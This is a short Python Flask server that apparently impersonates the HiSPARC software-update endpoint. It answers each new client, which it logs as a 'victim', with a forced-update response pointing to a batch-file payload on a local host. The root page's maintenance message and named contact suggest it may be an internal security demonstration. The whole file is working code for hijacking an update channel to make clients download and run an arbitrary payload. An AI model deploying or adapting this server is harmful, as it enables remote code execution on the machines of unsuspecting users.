import os
import sys

from flask import Flask
from flask import request

app = Flask(__name__, static_folder='static')


# payload should be in static/
PAYLOAD = 'static/userupdate16.bat'
assert(os.path.exists(PAYLOAD))


@app.route('/')
def hello_world():
    return 'Traffic redirected for maintenance. Mail tkooij at nikhef!'


@app.route('/software-updates/<path:subpath>')
@app.route('/django/software-updates/<path:subpath>')
def show_update(subpath):
    try:
        remote_ip = request.remote_addr
        print(f'Victim in trap: {remote_ip}', file=sys.stderr)
        flag_fn = 'victim_%s' % remote_ip
        if not os.path.exists(flag_fn):
            # flag does not exist: New victim!
            print(f'*********** New victim! {remote_ip}', file=sys.stderr)
            with open(flag_fn, 'w') as f:
                f.write('foobar!')
            return f'newVersionUser=14&mustUpdate=1&urlUser=http://192.168.2.47:5000/{PAYLOAD}'
        else:
            print(f'Not messing with old victim! {remote_ip}', file=sys.stderr)
            return 'mustUpdate=0'
    except Exception as e:
        # HiSPARC updater will crash (halt) on broken HTTP reply,
        # so if all fails at least return 'mustUpdate=0'
        print('**ERROR*** Exception:', e, file=sys.stderr)
        return 'mustUpdate=0'
